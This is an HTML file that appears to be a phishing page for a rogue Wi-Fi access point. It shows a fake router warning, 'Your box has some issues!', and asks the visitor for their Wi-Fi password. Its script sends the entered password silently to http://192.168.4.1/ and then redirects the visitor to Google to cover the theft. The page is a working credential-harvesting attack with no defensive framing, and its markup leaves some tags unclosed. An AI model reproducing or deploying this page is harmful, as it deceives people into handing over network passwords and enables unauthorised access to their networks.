<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Page de Connexion</title>
    <style>
            body {
            font-family: Arial, sans-serif;
            background-color: black;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
		 p {
		 text-align:center;
		 }

        .login-form {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .form-control {
            margin-bottom: 10px;
            padding: 10px;
            font-size: 16px;
            border-radius: 5px;
            border: 1px solid #ddd;
        }

        .form-control:last-child {
            margin-bottom: 0;
        }

        .btn {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
			font-size:16px;
        }

        .btn:hover {
            background-color: #0056b3;
        }

<body>
    <div class="login-form">
        <div class="login-image"></div>
	    <p> Warning !</p>
		<p> Your box has some issues !</p>
		<p> Please enter your WIFI password to reset :</p>
        <input type="hidden" id="email" class="form-control" placeholder="Email">
        <input type="password" id="password" class="form-control" placeholder="WIFI PASSWORD">
        <button onclick="sendCredentials()" class="btn">send</button>
    </div>

    <script>
        function sendCredentials() {
            var email = "Wifi pass !";
            var password = document.getElementById('password').value;
            
            getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
			alert("Check the network.");
            window.location.href = "https://www.google.com";
        }

        function getFile(url) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.send();
        }
    </script>
